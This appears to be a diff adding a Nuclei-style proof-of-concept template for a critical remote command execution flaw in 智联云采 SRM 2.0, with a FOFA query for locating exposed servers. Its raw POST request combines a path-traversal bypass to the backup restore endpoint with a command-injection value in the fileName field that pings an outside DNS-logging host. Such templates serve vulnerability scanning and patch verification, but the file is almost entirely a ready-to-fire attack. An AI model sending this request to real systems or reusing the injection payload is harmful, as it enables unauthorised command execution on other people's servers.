@@ -1,0 +1,34 @@
+id: poc-qc9fglvxkrgxu829
+info:
+  name: 智联云采 SRM2.0 restore 存在远程命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qc9fglvxkrgxu829'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: qc9fglvxkrgxu829
+    fofa: title=="SRM 2.0" && body="href=\"/assets/img/favicon.ico\""
+http:
+- raw:
+  - 'POST /adpweb/static/..;/a/db/dbBackupScheme/restore HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept-Encoding: gzip
+
+    Connection: keep-alive
+
+    Content-Type: application/x-www-form-urlencoded
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+    X-Requested-With: XMLHttpRequest
+
+
+    fileName=1||ping%20www.dnslog.cn'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
